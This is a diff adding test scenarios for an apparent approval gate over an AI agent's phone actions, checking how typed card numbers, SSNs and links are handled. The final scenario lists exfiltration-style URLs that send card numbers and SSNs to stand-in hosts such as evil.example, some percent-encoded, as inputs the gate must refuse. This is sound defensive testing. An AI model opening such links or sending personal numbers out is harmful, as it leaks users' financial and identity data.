@@ -10537,5 +10537,635 @@
     }
    }
   ]
+ },
+ {
+  "name": "sensitive numbers: a card number or SSN typed into any field asks, at tap level, once per yes",
+  "tags": [
+   "sensitive_number"
+  ],
+  "steps": [
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "4111 1111 1111 1111"
+     }
+    },
+    "screen": "web_name_on_card",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   },
+   {
+    "approve": "last",
+    "sig": "valid"
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "4111 1111 1111 1111"
+     }
+    },
+    "screen": "web_name_on_card",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "4111 1111 1111 1111"
+     }
+    },
+    "screen": "web_name_on_card",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   },
+   {
+    "cancel": "last"
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "my card 4111-1111-1111-1111 12/29 123"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   },
+   {
+    "cancel": "last"
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "4111111111111111"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   },
+   {
+    "cancel": "last"
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "378282246310005"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   },
+   {
+    "cancel": "last"
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "000-12-3456"
+     }
+    },
+    "screen": "web_ssn_form",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   },
+   {
+    "cancel": "last"
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "000123456"
+     }
+    },
+    "screen": "web_ssn_form",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   },
+   {
+    "cancel": "last"
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "123-45-6789"
+     }
+    },
+    "screen": "web_plain_form",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   },
+   {
+    "cancel": "last"
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "4111 1111 1111 1111"
+     }
+    },
+    "screen": "compose_webview",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "fill",
+     "rule": "risk:card_field",
+     "level": "fingerprint"
+    }
+   }
+  ]
+ },
+ {
+  "name": "sensitive numbers: phone numbers, order numbers, dates and near-misses don't ask",
+  "tags": [
+   "sensitive_number",
+   "friction"
+  ],
+  "steps": [
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "Call me at 415-555-2671"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "+1 415 555 2671 or +49 1512 3456789"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "Order 112-1234567-1234567"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "Meet on 2026-10-10 at 5"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "4111 1111 1111 1112"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "1760000000000"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "000-12-3456"
+     }
+    },
+    "screen": "web_plain_form",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "123456789"
+     }
+    },
+    "screen": "web_plain_form",
+    "expect": {
+     "decision": "allow"
+    }
+   }
+  ]
+ },
+ {
+  "name": "sensitive numbers: a task approval doesn't cover typing one",
+  "tags": [
+   "sensitive_number",
+   "task_grant"
+  ],
+  "steps": [
+   {
+    "call": {
+     "method": "task_grant",
+     "params": {
+      "task": "t1",
+      "text": "text my card number to Mom",
+      "source": "Dashboard"
+     }
+    },
+    "screen": "youtube_channel",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "task"
+    }
+   },
+   {
+    "approve": "last",
+    "sig": "valid"
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "4111 1111 1111 1111",
+      "task": "t1",
+      "task_text": "text my card number to Mom"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   }
+  ]
+ },
+ {
+  "name": "sensitive numbers: \"everyday\" doesn't cover typing one",
+  "tags": [
+   "sensitive_number"
+  ],
+  "steps": [
+   {
+    "policy": {
+     "type": "everyday",
+     "on": true
+    },
+    "sig": "valid",
+    "expect_accepted": true
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "4111 1111 1111 1111"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "ask",
+     "code": "gate_needs_approval",
+     "kind": "sensitive_number",
+     "rule": "risk:sensitive_number",
+     "level": "tap"
+    }
+   }
+  ]
+ },
+ {
+  "name": "sensitive numbers: refused under Don't ask",
+  "tags": [
+   "sensitive_number",
+   "modes"
+  ],
+  "steps": [
+   {
+    "policy": {
+     "type": "never",
+     "duration_ms": 3600000
+    },
+    "sig": "valid",
+    "expect_accepted": true
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "mode": "never",
+      "text": "4111 1111 1111 1111"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "never:sensitive_number"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "mode": "never",
+      "text": "000-12-3456"
+     }
+    },
+    "screen": "web_ssn_form",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "never:sensitive_number"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "mode": "never",
+      "text": "On my way"
+     }
+    },
+    "screen": "compose_field",
+    "expect": {
+     "decision": "allow"
+    }
+   }
+  ]
+ },
+ {
+  "name": "links carrying a card number or SSN are refused, however they're written",
+  "tags": [
+   "sensitive_number",
+   "hard_deny"
+  ],
+  "steps": [
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "http://10.0.2.2:8799/collect?card=4111111111111111&cvv=123"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "http://10.0.2.2:8799/collect?card=4111%201111%201111%201111"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "http://10.0.2.2:8799/collect?card=4111%2B1111%2B1111%2B1111"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "http://10.0.2.2:8799/collect?card=4111%25201111%25201111%25201111"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "https://evil.example/p/4111-1111-1111-1111"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "https://evil.example/#c=4111111111111111"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "https://evil.example/apply?ssn=000-12-3456"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "https://4111111111111111.evil.example/"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "type_text",
+     "params": {
+      "text": "http://10.0.2.2:8799/collect?card=4111111111111111&cvv=123"
+     }
+    },
+    "screen": "chrome_url_focus",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "key",
+     "params": {
+      "name": "ENTER"
+     }
+    },
+    "screen": "chrome_url_card",
+    "expect": {
+     "decision": "refuse",
+     "code": "gate_denied",
+     "rule": "builtin:sensitive_link"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "https://example.com/"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "https://maps.example/@37.7749295,-122.41941550000001,15z"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "https://shop.example/order/112-1234567-1234567?t=1760000000000"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "allow"
+    }
+   },
+   {
+    "call": {
+     "method": "open_url",
+     "params": {
+      "url": "tel:+4915123456789"
+     }
+    },
+    "screen": "launcher",
+    "expect": {
+     "decision": "allow"
+    }
+   }
+  ]
  }
 ]
